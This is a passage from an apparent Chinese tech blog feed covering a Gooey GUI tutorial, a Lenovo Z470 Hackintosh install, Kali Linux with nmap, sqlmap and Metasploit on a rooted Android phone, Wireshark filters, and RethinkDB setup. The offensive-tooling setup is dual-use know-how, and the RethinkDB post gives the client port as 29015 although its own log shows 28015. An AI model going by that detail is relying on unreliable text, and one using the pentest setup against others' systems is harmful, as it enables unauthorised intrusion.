<p>参数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">@Gooey(advanced=Boolean,          <span class="comment"># toggle whether to show advanced config or not </span></div><div class="line">       language=language_string,  <span class="comment"># Translations configurable via json</span></div><div class="line">       show_config=True,          <span class="comment"># skip config screens all together</span></div><div class="line">       program_name=<span class="string">'name'</span>,       <span class="comment"># Defaults to script name</span></div><div class="line">       program_description,       <span class="comment"># Defaults to ArgParse Description</span></div><div class="line">       default_size=(610, 530),   <span class="comment"># starting size of the GUI</span></div><div class="line">       required_cols=1,           <span class="comment"># number of columns in the "Required" section</span></div><div class="line">       optional_cols=2,           <span class="comment"># number of columbs in the "Optional" section</span></div><div class="line">       dump_build_config=False,   <span class="comment"># Dump the JSON Gooey uses to configure itself</span></div><div class="line">       load_build_config=None,    <span class="comment"># Loads a JSON Gooey-generated configuration</span></div><div class="line">       monospace_display=False)   <span class="comment"># Uses a mono-spaced font in the output screen</span></div><div class="line">       image_dir                  <span class="comment"># Path to the diretory in which Gooey should look for custom inmages</span></div><div class="line">       language_dir               <span class="comment"># Path to the diretory in which Gooey should look for custom languages</span></div><div class="line">)</div></pre></td></tr></table></figure></p>
<p>参数中最常用的有program_name（标题，默认为文件名），default_size(界面大小)，image_dir(ico图标地址，可以相对地址，windows下注意用反斜杠)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">@Gooey(program_name=u<span class="string">'这是一个测试脚本'</span>,default_size=(500,500))</div><div class="line">def main():</div><div class="line">	parser = argparse.ArgumentParser(description=u<span class="string">"测试描述内容"</span>)</div><div class="line">	parser.add_argument(<span class="string">"test"</span>,<span class="built_in">help</span>=<span class="string">"this is a test"</span> )</div><div class="line">	args=parser.parse_args()</div><div class="line">	<span class="built_in">print</span> args</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure></p>
<p>运行截图：<br><img src="/upload_image/20170215/2.png" alt=""></p>
<h3 id="使用GooeyParse"><a href="#使用GooeyParse" class="headerlink" title="使用GooeyParse"></a>使用GooeyParse</h3><p>简单例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">from gooey import Gooey, GooeyParser</div><div class="line"></div><div class="line">@Gooey(program_name=<span class="string">"test"</span>,image_dir=<span class="string">".\image"</span>) <span class="comment">##注意斜杠</span></div><div class="line">def main():</div><div class="line">    parser=GooeyParser(description=u<span class="string">"测试"</span>)</div><div class="line">    <span class="comment">##文本输入框</span></div><div class="line">    parser.add_argument(<span class="string">"test"</span>,<span class="built_in">help</span>=<span class="string">"this is a test"</span>)</div><div class="line">    <span class="comment">##选择框</span></div><div class="line">    parser.add_argument(</div><div class="line">     <span class="string">"test2"</span>,</div><div class="line">     metavar=<span class="string">'Should I exlode?'</span>,   <span class="comment">##描述内容</span></div><div class="line">     <span class="built_in">help</span>=<span class="string">"this is test2"</span>,         <span class="comment">##帮助内容</span></div><div class="line">     choices=[<span class="string">"Yes"</span>,<span class="string">"No"</span>],         <span class="comment">##选择框</span></div><div class="line">     default=<span class="string">"Yes"</span>                 <span class="comment">##默认值</span></div><div class="line">     )</div><div class="line">    <span class="comment">##复选框</span></div><div class="line">    parser.add_argument(</div><div class="line">       <span class="string">'-f'</span>,<span class="string">'--foo'</span>,</div><div class="line">       metavar=<span class="string">"some flag"</span>,</div><div class="line">       action=<span class="string">"store_true"</span>,        <span class="comment">##参数类型</span></div><div class="line">       <span class="built_in">help</span>=<span class="string">""</span>)</div><div class="line">    <span class="comment">##文本选择按钮</span></div><div class="line">    parser.add_argument(<span class="string">'filename'</span>, metavar=u<span class="string">"文件选择"</span>,<span class="built_in">help</span>=<span class="string">"name of the file to process"</span>, widget=<span class="string">'FileChooser'</span>) <span class="comment">#文本选择按钮</span></div><div class="line">    parser.add_argument(<span class="string">'datetime'</span>, metavar=u<span class="string">"时间选择"</span>,<span class="built_in">help</span>=<span class="string">"date to process"</span>,widget=<span class="string">'DateChooser'</span>,default=<span class="string">"2017-02-15"</span>) <span class="comment">#时间选择按钮</span></div><div class="line">    args=parser.parse_args()</div><div class="line">    <span class="built_in">print</span> args</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">     main()</div></pre></td></tr></table></figure></p>
<p>运行截图：<br><img src="/upload_image/20170215/3.png" alt=""><br>说明：image_dir设置为当前目录下image目录，则程序会去image目录下寻找相应的图片来覆盖默认的图片，因此覆盖的图片名字必须为默认的图片名;可以看到运行界面上分为Required Arguments与Optional Arguments参数，代码中’test’对应前者，’-test’对应后者；metavar表示描述信息；action表示控件类型；help为帮助信息；widget为小工具；default为默认内容。</p>
<p>image目录下图片文件名，分别用来覆盖界面上的图片：</p>
<ul>
<li>program_icon.ico  　　ico图标</li>
<li>success_icon.png  　　运行成功的图标</li>
<li>running_icon.png  　　正在运行时的图标</li>
<li>loading_icon.gif  　　加载时的图标</li>
<li>config_icon.png   　　配置图片</li>
<li>error_icon.png    　　出错时的图片</li>
</ul>
<p>action内容表示参数类型，分别对应着wxpython相应的控件：</p>
<ul>
<li>store 　　TextCtrl</li>
<li>store_const 　　CheckBox</li>
<li>store_true  　　CheckBox</li>
<li>store_False 　　CheckBox</li>
<li>append      　　TextCtrl</li>
<li>count       　　DropDown</li>
<li>Mutually Exclusive Group  　　RadioGroup</li>
<li>chooice     　　DropDown</li>
</ul>
<p>除了action之外，Gooey还提供了一些小工具（Widgets）</p>
<ul>
<li>DirChooser   　　目录选择按钮工具</li>
<li>FileChooser  　　文件选择按钮工具</li>
<li>DateChooser  　　时间选择按钮工具</li>
</ul>
<h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>　　说说个人使用的一点总结，优点是方便，无需太多的代码，也免去了界面设计。缺点是不太适合操作非常复杂的程序，且目前支持的控件不多。额外一点，在打包程序时，会有很多Bug，有待解决。</p>
<p>参考文档：<br>GitHub地址:<a href="https://github.com/chriskiehl/Gooey" target="_blank" rel="external">https://github.com/chriskiehl/Gooey</a><br>官方例子：<a href="https://github.com/chriskiehl/GooeyExamples/tree/master/examples" target="_blank" rel="external">https://github.com/chriskiehl/GooeyExamples/tree/master/examples</a><br>官方文档：<a href="https://github.com/chriskiehl/Gooey#how-does-it-work" target="_blank" rel="external">https://github.com/chriskiehl/Gooey#how-does-it-work</a></p>
]]></content>
      
        <categories>
            
            <category> 编程之道 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Gooey </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[联想Z470黑化之路]]></title>
      <url>http://thief.one/2017/02/13/%E8%81%94%E6%83%B3Z470%E9%BB%91%E8%8B%B9%E6%9E%9C%E6%95%99%E7%A8%8B/</url>
      <content type="html"><![CDATA[<p>　　11年入手了一台联想Z470，到现在也有些年头了，当年是看中了它的外观，现在想来性能是它的短板。然而为了工作需要，我便又购置了一台高性能电脑。现如今便想着怎么处理这台小Z，有人建议当废品出售，但无论如何它都跟了我这么多年，舍弃有些不忍。抱着勤俭持家的态度，我便狠了狠心决定多花点钱，将它全面更新升级。在上网找了些资料后，便开始整理思路，汇总如下：</p>
<ul>
<li>更新内容：将原有部分硬件换新（声卡、网卡、外壳、键盘等）</li>
<li>升级内容：内存加到8G，添加固态硬盘</li>
<li>系统更换：黑化之苹果系统</li>
</ul>
<p>　　这其中最繁琐的要数装黑苹果系统，技术含量比较高，前2个比较好实现（只要花钱）。有了目标，便开始淘宝购买物件吧，前后大概花了800多，终于凑齐了所有所需之物，好了，那么便开始吧！</p>
<h3 id="更换升级零件"><a href="#更换升级零件" class="headerlink" title="更换升级零件"></a>更换升级零件</h3><p>　　对于物件更换，这里不多介绍，只要会拆机就行，拆机之前多上网查查机型，根据教程来，不要盲目拆机。<br>　　加内存条也比较简单，也是先查询机型兼容的内存条型号，购买相应的装入即可。<br>　　至于安装SSD（固态硬盘），我的做法是将光驱拆下，将原有的机械硬盘放到光驱（需要购买托盘），再将SSD装入原先机械硬盘处即可。<br>　　以上一切做完之后，小Z已经从硬件上进行了全面大升级（显卡跟CPU不建议更改，可能会使主板损坏，其提升效果不明显）。接下来就是本文重点，更换苹果系统。</p>
<h3 id="安装黑苹果"><a href="#安装黑苹果" class="headerlink" title="安装黑苹果"></a>安装黑苹果</h3><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><ul>
<li>第一：上网查资料，上网查资料，上网查资料。。。。。重要的事情多说几遍，要学会自己查找答案。</li>
<li>第二：查找对应机型的电脑是否有安装黑苹果成功的案例，如果没有，那么我觉得是时候放弃了（除非是专门研究黑苹果的技术男，不然不要轻易去试）。我算运气比较好的，上网查了一圈，发现有不少小Z安装黑苹果成功的案例。</li>
<li>第三：根据网上成功的教程，下载好所需的软件，复制网上成功的路线。<br>  所需软件：<ul>
<li>变色龙引导程序</li>
<li>懒人版镜像</li>
<li>硬盘助手</li>
<li>HFS</li>
<li>DiskGenius Pro 4.30</li>
<li>……</li>
</ul>
</li>
</ul>
<p>准备工作都弄好了，那么可以开始动手干了！</p>
<h5 id="安装变色龙引导程序"><a href="#安装变色龙引导程序" class="headerlink" title="安装变色龙引导程序"></a>安装变色龙引导程序</h5><p><img src="/upload_image/20170213/1.png" alt=""><br>以管理员身份打开：<br><img src="/upload_image/20170213/2.png" alt=""><br>　　如果点击安装，没有反应，则需要打开电脑磁盘管理（右击计算机，管理），给那个100M的隐藏磁盘分配盘符（注意不能分配A盘符，其余的盘符都可以分配），分配完后，重新打开变色龙安装程序，重新安装。安装完成后，会在C盘或者100M的系统隐藏盘生成3个隐藏文件。<br><img src="/upload_image/20170213/3.png" alt=""><br>这3个文件是变色龙的引导文件。</p>
<h5 id="安装HFS"><a href="#安装HFS" class="headerlink" title="安装HFS"></a>安装HFS</h5><p><img src="/upload_image/20170213/4.png" alt=""><br>直接双击运行，一路安装，具体作用自行百度吧。</p>
<h5 id="给电脑分区"><a href="#给电脑分区" class="headerlink" title="给电脑分区"></a>给电脑分区</h5><p>首先分配一个8G大小的区，注意不要格式化。（用来放OSX安装程序，相当于硬盘安装盘）<br>然后再分配个大小不上限的区，注意不要格式化。（用来安装OSX，相当于windows的C盘）</p>
<h5 id="打开硬盘助手"><a href="#打开硬盘助手" class="headerlink" title="打开硬盘助手"></a>打开硬盘助手</h5><p><img src="/upload_image/20170213/5.png" alt=""><br>将下载好的系统盘（我用的是懒人版，7.5G大小），写入刚分配好的8G大小的磁盘中，需要等到几分钟。。。</p>
<h5 id="DiskGenius-Pro-4-30（查看磁盘状态工具）"><a href="#DiskGenius-Pro-4-30（查看磁盘状态工具）" class="headerlink" title="DiskGenius Pro 4.30（查看磁盘状态工具）"></a>DiskGenius Pro 4.30（查看磁盘状态工具）</h5><p><img src="/upload_image/20170213/6.png" alt=""><br>将刚才分的2个磁盘（8G，不上限大小），标识都设置为AF。右击更改参数，直接改为AF。</p>
<h5 id="将EFI文件放入安装盘根目录"><a href="#将EFI文件放入安装盘根目录" class="headerlink" title="将EFI文件放入安装盘根目录"></a>将EFI文件放入安装盘根目录</h5><p><img src="/upload_image/20170213/7.png" alt=""><br>即放在那个8G大小的盘根目录。<br>注意：如果打开资源管理器，看不到8G的那个磁盘，可以重启电脑再看看。实在没有，估计是磁盘分区有问题，可能就需要重装系统了。</p>
<h5 id="EDID注入"><a href="#EDID注入" class="headerlink" title="EDID注入"></a>EDID注入</h5><p>EFI下面有一个config.split文件，需要替换成自己电脑的edid（替换方法自行百度），这个文件是clover引导的配置文件，至关重要。</p>
<h5 id="将Clover-iso替换wowpc-iso"><a href="#将Clover-iso替换wowpc-iso" class="headerlink" title="将Clover.iso替换wowpc.iso"></a>将Clover.iso替换wowpc.iso</h5><p>将clover.iso重命名为wowpc.iso，然后替换C盘或者隐藏盘下的wowpc.iso。这样变色龙引导会直接跳转到clover引导。</p>
<h4 id="安装阶段"><a href="#安装阶段" class="headerlink" title="安装阶段"></a>安装阶段</h4><p>　　安装的过程中，最主要的是看会不会卡logo，或者黑屏。如果出现这2种情况，绝大部分原因是config.split配置文件的问题。如果一切正常，那么会成功进入安装界面，在选择安装到哪个盘时，要先选择菜单栏上的磁盘工具找到那个分配的准备拿来存放OSX系统的磁盘，选择抹掉，格式为OS（日志格式），再回到安装界面，就会发现可以选择那个磁盘进行安装了。</p>
<h4 id="驱动配置"><a href="#驱动配置" class="headerlink" title="驱动配置"></a>驱动配置</h4><p>　　等到安装完成，就差不多可以用了，但是无线网卡驱动跟声音驱动还没有弄好。<br>　　安装无线网卡驱动：改无线网卡2a为2b，方法为finder进10.11系统盘system/library/extensions/,找到IO82011Family.kext，右键显示包内容找到/contents/Pluglus/AirportAtheros40.kext，继续右键显示包内容，找到contents/Info.pilst，用plistEdit Pro（自行百度安装该软件）打开，找到：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;array&gt;</div><div class="line">        &lt;string&gt;pci168c,30&lt;/string&gt;</div><div class="line">        &lt;string&gt;pci168c,2a&lt;/string&gt;</div><div class="line">        &lt;string&gt;pci106b,0086&lt;/string&gt;</div><div class="line">        &lt;string&gt;pci168c,1c&lt;/string&gt;</div><div class="line">        &lt;string&gt;pci168c,23&lt;/string&gt;</div><div class="line">        &lt;string&gt;pci168c,24&lt;/string&gt;</div><div class="line">&lt;/array&gt;</div></pre></td></tr></table></figure></p>
<p>代码，将第三行里面的2a改为2b，保存退出，之后用KCPM Utility Pro.app修复重建缓存<br>，重启。重启之后无线网卡应该能成功驱动了。<br>　　安装声卡驱动：即AppleHDA.kext驱动，删除system/library/extensions/AppleHDA.kext后，用KCPM Utility Pro进行安装，路径也为system/library/extensions/，安装完成之后重建缓存即可。</p>
<h4 id="截图见证"><a href="#截图见证" class="headerlink" title="截图见证"></a>截图见证</h4><p><img src="/upload_image/20170213/8.png" alt=""><br><img src="/upload_image/20170213/9.png" alt=""></p>
<p><em>提醒：以上过程只适用于联想Z470，其他机型请上网查资料……</em></p>
<p>参考：<a href="http://bbs.pcbeta.com/viewthread-1662315-1-1.html" target="_blank" rel="external">远景论坛</a></p>
]]></content>
      
        <categories>
            
            <category> 技术研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 黑苹果 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[安卓版Kali-linux]]></title>
      <url>http://thief.one/2017/02/10/%E5%AE%89%E5%8D%93%E7%89%88Kali-linux/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center">有时候折腾仅仅只是为了折腾，仅此而已！</blockquote><br>据说OPPO拍照神器最近很火，于是便凑热闹买了一款（R9s），外形不错，性能说得过去。尤其是自拍功能爱不释手（……），于是手头原本的小米便闲置了出来。作为一名崇尚节俭持家的技术男，当然是要废物利用一番，于是便有了以下的一番折腾。<br>　　我的目的是打造一款渗透测试专用手机，最先想到的方案是在手机上安装kali-linx系统，因为该系统集成了很多渗透测试工具，解决了很多依赖问题，省去不少麻烦。那么问题来了，怎么在手机上安装kali-linux系统呢？在查找了一些资料之后，我理了理思路：<br>（1）手机需要root<br>（2）手机上安装linux-deploy<br>（3）在linux-deploy上安装kali<br>（4）在kali里面安装渗透测试工具<br>思路有了，那么让我们撸起袖子干起来吧！(以下提到的安装包会在文章最后提供下载！)</p>
<h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><p>　　起初看到网上的一些教程，介绍root手机非常简单，下载第三方软件，便可一键root。于是抱着轻松地态度在电脑上下载了一款软件（root精灵），接着将手机连上电脑，便开始点击一键root了。过了几分钟提示root成功，心想，原来破解手机这么简单，刚想吐槽小米，打开手机便发现根本没有root成功，NM坑爹。然后卸载了此软件，又重新找了一款（root大师），结果同样如此。<br>　　心中默默骂了几条街后，喝口水冷静了会，重新上网搜索资料，竟然无意看到了小米官方提供开发者版本的安装包（晕倒，所以不能盲目使用第三方软件，一般厂商会给出相应的软件或者安装包）。<br>　　官方下载地址：<a href="http://www.miui.com/download-241.html" target="_blank" rel="external">http://www.miui.com/download-241.html</a><br>　　根据官方提供的教程安装即可（我选择了第二种安装方式），安装完以后在安全中心授予应用程序root权限，其他品牌的手机请自行百度，方法大同小异。</p>
<h3 id="安装linux-deploy"><a href="#安装linux-deploy" class="headerlink" title="安装linux-deploy"></a>安装linux-deploy</h3><p>　　Linux deploy是一个可以快速在Android设备上安装运行Linux操作系统的App,遵循GPLv3协议，运行需要root权限。linux-deploy软件介绍：<a href="http://www.cnblogs.com/mzlw/p/4841707.html" target="_blank" rel="external">http://www.cnblogs.com/mzlw/p/4841707.html</a><br>在手机上安装完linux-deploy，运行后进行配置：<br><img src="/upload_image/20170210/3.png" alt=""><br>运行界面如上图所示，点击右下角进行配置：<br><img src="/upload_image/20170210/1.png" alt=""><br>发行版选择：kali-linux；源地址选择国内镜像：<a href="http://202.141.160.110/kali/" target="_blank" rel="external">http://202.141.160.110/kali/</a><br><img src="/upload_image/20170210/2.png" alt=""><br>勾选上ssh,vnc，在启动系统后会自动开启ssh以及vnc服务，方便远程管理。<br>配置完成后点击安装，等待一会。<br><img src="/upload_image/20170210/4.png" alt=""><br>安装完以后点击启动，如若成功，便可以用ssh工具连接此系统。<br><img src="/upload_image/20170210/6.png" alt=""></p>
<p>注：linux-deploy只是一款软件，安装它对应手机本身不会造成什么影响（除了占用存储空间），也不会清空数据（不是刷机）</p>
<p>linux-deploy安装kali参考：<br><a href="http://www.freebuf.com/articles/terminal/13209.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/13209.html</a><br><a href="http://www.freebuf.com/articles/terminal/47817.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/47817.html</a></p>
<h3 id="kali上安装渗透工具"><a href="#kali上安装渗透工具" class="headerlink" title="kali上安装渗透工具"></a>kali上安装渗透工具</h3><p>　　虽然手机上安装kali成功了，但是此kali系统上并没有任何工具，需要自己安装。因为kali官方的源太慢了，因此建议更换国内的源。手机上安装一个ssh远程连接工具，连接上kali系统，并输入以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/apt/sources.list</div></pre></td></tr></table></figure></p>
<p>清空文件内容并添加以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">deb http://202.141.160.110/kali/ kali-rolling main contrib non-free</div><div class="line">deb-src http://202.141.160.110/kali kali-rolling main contrib non-free</div></pre></td></tr></table></figure></p>
<p>更换完以后，更新源：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo su       <span class="comment">#切换到root用户</span></div><div class="line">apt-get update</div><div class="line">apt-get upgrade</div></pre></td></tr></table></figure></p>
<p>安装工具：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">apt-get install nmap</div><div class="line">apt-get install sqlmap</div><div class="line">apt-get install metasploit-framework</div><div class="line">......</div></pre></td></tr></table></figure></p>
<p>运行截图：<br><img src="/upload_image/20170210/5.png" alt=""><br><em>运行速度还行，方便携带，居家旅行必备神器！</em></p>
<h3 id="其他安全工具"><a href="#其他安全工具" class="headerlink" title="其他安全工具"></a>其他安全工具</h3><p>　　除了在安卓手机上安装kali系统以外，很多安全软件也支持安卓系统，比如dsploit、busybox、nmap for android等。首先在手机上安装busybox软件（授予root权限），运行软件以后勾选上智能安装选项，然后点击安装busybox。安装完busybox后，才可以使用dsploit等软件，当然这些软件也都是需要root权限的。至于这些安全软件的用法，网上一搜一大推，这里便不再介绍了。</p>
<h3 id="软件工具下载"><a href="#软件工具下载" class="headerlink" title="软件工具下载"></a>软件工具下载</h3><p>链接: <a href="https://pan.baidu.com/s/1miqcGjQ" target="_blank" rel="external">https://pan.baidu.com/s/1miqcGjQ</a>  密码: ch5f</p>
]]></content>
      
        <categories>
            
            <category> 技术研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WireShark过滤规则]]></title>
      <url>http://thief.one/2017/02/09/WireShark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/</url>
      <content type="html"><![CDATA[<p>　　wireshark是一款网络流量抓取分析神器，也是安全工具使用排行中排名第一的工具。使用wireshark必须要牢记一些常用的数据包过滤规则，对于寻找一些特定的包会事半功倍。</p>
<h3 id="IP过滤"><a href="#IP过滤" class="headerlink" title="IP过滤"></a>IP过滤</h3><p>ip源地址：　　ip.src　　　　ip.src==10.0.3.109<br>ip目的地址: 　　ip.dst　　　　ip.dst==10.0.3.114</p>
<h3 id="端口过滤"><a href="#端口过滤" class="headerlink" title="端口过滤"></a>端口过滤</h3><p>tcp.port==80　　　　所有端口为80的包<br>tcp.dstport==80　　　目的端口为80的包<br>tcp.srcport==80　　　源端口为80的包</p>
<h3 id="协议过滤"><a href="#协议过滤" class="headerlink" title="协议过滤"></a>协议过滤</h3><p>http<br>tcp<br>icmp<br>…….</p>
<h3 id="http模式过滤"><a href="#http模式过滤" class="headerlink" title="http模式过滤"></a>http模式过滤</h3><p>http.request.method==”GET”　　查找GET包<br>http.request.method==”POST”　　查找POST包</p>
<h3 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a>连接符</h3><p>and　　&amp;<br>or　　||</p>
<h3 id="自助模式"><a href="#自助模式" class="headerlink" title="自助模式"></a>自助模式</h3><p>可以打开wireshark的Expression会弹出Filter Expression窗口：<br><img src="/upload_image/20170209/1.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> 安全工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> wireshark </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Rethinkdb搭建与使用]]></title>
      <url>http://thief.one/2017/02/07/rethinkdb%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>　　首先惊喜rethinkdb开源了，为开源精神点赞（无论背后是哪种原因）……既然如此，就来介绍一下Nosql界的黑科技–rethinkdb吧。我与rethibkdb相识于16年夏，因为一个项目的需要，当时徘徊于mongodb与rethinkdb之间，但最终还是选择了rethinkdb，两者之间的好坏暂且不论，我也只是用其一点皮毛，这里结合自身使用以及官方介绍简单记录一番。<br>　　rethinkdb属于Nosql数据库，它具有可视化管理，支持多平台等优点，如果我们需要实时的数据时，它是最为合适的。当然在使用过程中，我也发现了一点它的一点缺陷，不支持多线程储存（很有可能是因为我没有用好，当时时间紧迫，也没来得及去解决，如有解决方案，期望告知一二）。<br>详细介绍请参考：<a href="https://rethinkdb.com/faq/" target="_blank" rel="external">https://rethinkdb.com/faq/</a></p>
<p>rethinkdb分为server与client，server端也就是搭建的rethinkdb数据库，用于储存以及提供服务；clinet是用来连接操作数据库内容的，支持多种编程语言。</p>
<h3 id="Server端安装使用"><a href="#Server端安装使用" class="headerlink" title="Server端安装使用"></a>Server端安装使用</h3><p>server安装支持平台：linux，windows，mac</p>
<h4 id="ubuntu安装"><a href="#ubuntu安装" class="headerlink" title="ubuntu安装"></a>ubuntu安装</h4><p>直接使用apt-get安装：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> /etc/lsb-release &amp;&amp; <span class="built_in">echo</span> <span class="string">"deb http://download.rethinkdb.com/apt <span class="variable">$DISTRIB_CODENAME</span> main"</span> | sudo tee /etc/apt/sources.list.d/rethinkdb.list</div><div class="line">wget -qO- https://download.rethinkdb.com/apt/pubkey.gpg | sudo apt-key add -</div><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install rethinkdb</div></pre></td></tr></table></figure></p>
<p>运行rethinkdb服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ rethinkdb</div><div class="line">info: Creating directory /home/user/rethinkdb_data</div><div class="line">info: Listening <span class="keyword">for</span> intracluster connections on port 29015</div><div class="line">info: Listening <span class="keyword">for</span> client driver connections on port 28015</div><div class="line">info: Listening <span class="keyword">for</span> administrative HTTP connections on port 8080</div><div class="line">info: Server ready</div></pre></td></tr></table></figure></p>
<p>其他安装方式请参考：<a href="https://rethinkdb.com/docs/install/ubuntu/" target="_blank" rel="external">https://rethinkdb.com/docs/install/ubuntu/</a></p>
<h4 id="windows安装"><a href="#windows安装" class="headerlink" title="windows安装"></a>windows安装</h4><p>下载安装包：<br><a href="https://download.rethinkdb.com/windows/rethinkdb-2.3.5.zip" target="_blank" rel="external">https://download.rethinkdb.com/windows/rethinkdb-2.3.5.zip</a><br>运行rethinkdb程序：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">C:\Users\Slava\&gt;<span class="built_in">cd</span> RethinkDB</div><div class="line">C:\Users\Slava\RethinkDB\&gt;</div><div class="line">C:\Users\Slava\RethinkDB\&gt;rethinkdb.exe</div></pre></td></tr></table></figure></p>
<p>注意：运行rethinkdb数据库后，默认开启8080端口，访问localhost:8080展示的web页面用来管理数据库；默认开启29015端口，用来连接客户端交互数据。<br>web管理页面：<br><img src="/upload_image/20170207/1.png" alt=""></p>
<h3 id="Client端安装使用"><a href="#Client端安装使用" class="headerlink" title="Client端安装使用"></a>Client端安装使用</h3><p>Client端支持编程语言：javascript，ruby，python，java，这里以python举例。</p>
<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><h5 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo pip install rethinkdb</div></pre></td></tr></table></figure>
<h5 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">import rethinkdb as r</div><div class="line">class dbOperation():</div><div class="line">    def __init__(self,dbname,tablename):</div><div class="line">        self.conn = r.connect(host=<span class="string">"localhost"</span>,port=29015)</div><div class="line">        self.table = r.db(dbname).table(tablename)</div><div class="line"></div><div class="line">    def Insert(self,document):</div><div class="line">        <span class="string">''</span><span class="string">'</span></div><div class="line">        插入记录到数据库</div><div class="line">        '<span class="string">''</span></div><div class="line">        <span class="built_in">return</span> self.table.insert(document, conflict=<span class="string">"update"</span>).run(self.conn)</div><div class="line"></div><div class="line">    def query(self,**kwargs):</div><div class="line">        <span class="string">''</span><span class="string">'</span></div><div class="line">        自定义查询</div><div class="line">        '<span class="string">''</span></div><div class="line">        f=self.table.run(self.conn)  <span class="comment">##选择网站名称为空的记录。</span></div><div class="line">        content=[]</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f:</div><div class="line">            content.append(i)</div><div class="line">        <span class="built_in">return</span> content</div></pre></td></tr></table></figure>
<p>详情请参考：<a href="https://rethinkdb.com/docs/cookbook/python/" target="_blank" rel="external">https://rethinkdb.com/docs/cookbook/python/</a></p>
<h3 id="Data-Explorer工具"><a href="#Data-Explorer工具" class="headerlink" title="Data Explorer工具"></a>Data Explorer工具</h3><p>这是rethinkdb自带的一个工具，可用执行数据库语句，查询修改数据库内容。<br><img src="/upload_image/20170207/2.png" alt=""></p>
